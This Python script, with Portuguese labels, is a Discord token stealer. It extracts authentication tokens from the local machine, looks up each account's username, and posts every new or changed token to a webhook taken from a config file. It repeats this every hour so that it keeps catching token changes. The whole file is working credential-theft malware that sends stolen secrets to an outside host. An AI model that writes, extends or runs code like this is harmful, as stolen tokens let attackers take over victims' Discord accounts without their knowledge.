import time
from discordtoken import TokenExtractor
import sys
import os
import json
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from main import enviar_para_discord


def load_config():
    config_path = 'config.json'
    with open(config_path, 'r') as f:
        return json.load(f)

cfg = load_config()
DISCORD_WEBHOOK_URL = cfg.get("WEBHOOK")

def monitorar_tokens():
    extractor = TokenExtractor()
    users_monitorados = {}

    print("Iniciando Verificação: ")
    while True:
        tokens_novos = set(extractor.get_tokens())
        print(f"Tokens Novos extraidos: {tokens_novos}")

        for token in tokens_novos:
            user_data = extractor.get_user_data(token)
            if user_data:
                user_id = user_data['id']
                username = user_data.get('username', 'desconhecido')
                print(f'Processando Usuario: {username}')

                if user_id not in users_monitorados:
                    users_monitorados[user_id] = token
                    print(f"\nNovo Token Encontrado:\nUsername: {user_data['username']}\nToken: {token}")
                    embed = {
                        'title': 'Novo Token Encontrado',
                        'description': f"**Username:** {user_data['username']}\n**Token:** `{token}`",
                        'color': 0x00ff00  
                    }
                    enviar_para_discord(DISCORD_WEBHOOK_URL, '', embed=embed)

                else:
                    token_antigo = users_monitorados[user_id]
                    if token_antigo != token:
                        print(f"{user_data['username']} Teve seu Token Alterado\nToken Antigo: {token_antigo}\nNovo Token: {token}\n")
                        users_monitorados[user_id] = token

                        embed = {
                            'title': 'Token Alterado',
                            'description': (f"**Username:** {user_data['username']}\n"
                                            f"**Token Antigo:** `{token_antigo}`\n"
                                            f"**Novo Token:** `{token}`"),
                            'color': 0xffa500  
                        }
                        enviar_para_discord(DISCORD_WEBHOOK_URL, '', embed=embed)

                    else:
                        print(f"Usuario: {user_data['username']} já está sendo monitorado")
            else:
                print("Token Não Encontrado")

        time.sleep(3600)

if __name__ == "__main__":
    monitorar_tokens()
